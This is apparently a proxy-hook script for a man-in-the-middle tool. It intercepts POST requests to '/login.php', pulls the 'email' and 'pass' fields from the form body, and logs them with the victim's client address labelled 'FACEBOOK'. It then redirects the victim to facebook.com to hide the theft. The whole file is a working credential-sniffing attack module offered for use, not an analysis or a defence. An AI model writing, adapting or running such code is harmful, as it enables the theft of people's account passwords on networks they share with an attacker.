
var RESET = "\033[0m";

function R(s) {
    return "\033[31m" + s + RESET;
}

function G(s) {
    return "\033[32m" + s + RESET;
}

function B(s) {
    return "\033[34m" + s + RESET;
}

function Y(s) {
    return "\033[33m" + s + RESET;
}

function DIM(s) {
    return "\033[2m" + s + RESET;
}

function BOLD(s) {
    return "\033[1m" + s + RESET;
}

function onRequest(req, res) {
    if( req.Method == "POST" && req.Path == "/login.php" && req.ContentType == "application/x-www-form-urlencoded" ) {
        var body = req.ReadBody();
        var parts = body.split('&');
        var email = "?", pass = "?";

        for( var i = 0; i < parts.length; i++ ) {
            var nv = parts[i].split('=');
            if( nv[0] == "email" ) {
                email = nv[1];
            } 
            else if( nv[0] == "pass" ) {
                pass = nv[1];
            }
        }
    
        log( R(req.Client), " > FACEBOOK > email:", B(email), " pass:'" + B(pass) + "'" );

        res.Status      = 301;
        res.Headers     = "Location: https://www.facebook.com/\n" +
                          "Connection: close";
        res.Updated()
    }
}
